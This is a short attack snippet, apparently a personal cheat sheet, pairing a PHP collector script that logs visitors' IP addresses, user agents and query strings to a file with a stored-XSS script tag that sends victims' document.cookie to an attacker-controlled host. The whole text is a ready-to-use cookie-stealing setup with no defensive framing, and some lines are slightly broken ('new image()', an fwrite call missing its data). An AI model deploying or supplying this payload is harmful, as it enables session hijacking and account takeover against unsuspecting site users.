##########################################################################################################

get.php file on web server to write received data to jar.txt

##########################################################################################################
```
<?php

$ip = $_SERVER['REMOTE_ADDR'];
$browser = $_SERVER['HTTP_USER_AGENT'];

$fp = fopen('jar.txt', 'a');

fwrite($fp, $ip.' '.$browser." \n");
fwrite($fp, urldecode($_SERVER['QUERY_STRING']). " \n\n");
fwrite($fp);
?>
```
##########################################################################################################

php string to send cookies to above php file. using stored xss when a user visits site with this xss on it will send there cookie to above php code file

##########################################################################################################

```<script> var i = new image(); i.src="http://attacker.site/get.php?cookie="+escape(document.cookie)</script>```
